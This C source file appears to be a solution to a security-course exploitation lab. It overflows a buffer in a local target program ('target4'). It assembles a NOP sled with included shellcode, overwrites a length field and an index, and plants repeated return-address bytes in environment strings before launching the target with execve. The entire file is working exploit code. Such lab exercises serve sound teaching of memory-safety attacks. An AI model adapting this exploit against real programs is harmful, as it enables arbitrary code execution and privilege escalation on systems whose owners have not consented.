#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
  	char *args[3];
  	char *env[8];

	char attack[172];
	strcpy(attack, "\x90\x90\x90");
	strcat(attack, shellcode);

	int i;
	for (i = 0; i < 120; i ++)
        strcat(attack, "\x90");


	int *len_ptr = (int *) &attack[168];
	*len_ptr  = 0x000000bb;

	char i_str[4];
	int *i_ptr = (int *) &i_str[0];
	*i_ptr = 0x000000ac;


	char addr_str[32];
	strcpy(addr_str, "\x90\x90\x90\x90");
	for (i = 0; i < 4; i++)
		strcat(addr_str, "\xb0\xfd\x21\x20");


  	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

  	env[0] = &attack[170];
	env[1] = &attack[171];
	env[2] = &i_str[0];
	env[3] = &i_str[2];
	env[4] = &i_str[3];
	env[5] = (char *)&addr_str;

  	if (0 > execve(TARGET, args, env))
    	fprintf(stderr, "execve failed.\n");

  	return 0;
}
